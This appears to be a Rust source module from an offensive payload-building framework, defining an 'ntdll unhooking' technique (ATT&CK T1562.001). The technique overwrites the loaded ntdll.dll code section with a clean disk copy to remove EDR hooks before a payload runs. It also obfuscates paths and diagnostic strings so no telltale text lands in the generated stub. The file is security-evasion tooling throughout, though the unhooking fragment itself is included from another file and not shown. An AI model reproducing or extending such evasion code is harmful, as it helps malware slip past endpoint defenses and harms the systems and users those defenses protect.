//! ntdll unhooking.
//!
//! Restores the `.text` of the loaded `ntdll.dll` from a clean copy read from
//! disk, so userland hooks an EDR installed in the stub's own process are
//! removed before the payload runs. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for ntdll unhooking.
///
/// The technique is deliberately parameterless: the target is always the loaded
/// `ntdll.dll`, and the clean copy comes from the same path the syscall layer
/// reads (`C:\Windows\System32\ntdll.dll`). A plan-supplied path could point at
/// a different build than the one whose SSNs `init_syscalls()` resolved, which
/// is the failure mode the README's implementation notes describe.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {}

/// Static metadata for ntdll unhooking.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "unhook_ntdll",
    attck: &["T1562.001"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/unhook_ntdll/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: unhook_ntdll\n",
    readme: include_str!("README.md"),
    // Only the page-protection change is a kernel call; `GetModuleHandleA` and
    // `std::fs::read` stay host entry points (like `LoadLibraryA` elsewhere), so
    // `mode: indirect` removes the `VirtualProtect` import.
    syscalls: &["NtProtectVirtualMemory"],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — and no technique keyword —
/// lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_MODULE_NOT_FOUND$",
        "unhook_ntdll: the loaded module could not be found",
    ),
    (
        "$MSG_READ_FAILED$",
        "unhook_ntdll: could not read the clean copy from disk",
    ),
    (
        "$MSG_MALFORMED$",
        "unhook_ntdll: the clean copy's PE headers are malformed",
    ),
    (
        "$MSG_NO_TEXT$",
        "unhook_ntdll: the clean copy has no code section",
    ),
    (
        "$MSG_TEXT_EMPTY$",
        "unhook_ntdll: the clean copy's code section is empty",
    ),
    (
        "$MSG_TEXT_TRUNCATED$",
        "unhook_ntdll: the clean copy's code section does not fit the file",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "unhook_ntdll: could not make the loaded code section writable",
    ),
    (
        "$MSG_RELOCATION$",
        "unhook_ntdll: the clean copy has an unsupported relocation inside the code section",
    ),
    (
        "$MSG_RESTORE_FAILED$",
        "unhook_ntdll: could not restore the code section's protection",
    ),
];

impl Params {
    /// Renders the ntdll-unhooking stub fragment.
    ///
    /// The clean copy's path, the module name and every diagnostic are rebuilt
    /// at runtime with the active string strategy, so neither the path nor the
    /// message text appears in the generated stub's strings.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let ntdll_def = strings
            .obfuscate("ntdll.dll")
            .render_stub_expr("ntdll_name");
        let ntdll_path = strings
            .obfuscate(r"C:\Windows\System32\ntdll.dll")
            .render_stub_expr("ntdll_path");

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered
            .replace("$NTDLL_DEF$", &ntdll_def)
            .replace("$NTDLL_PATH_DEF$", &ntdll_path)
    }
}

#[cfg(test)]
mod tests;
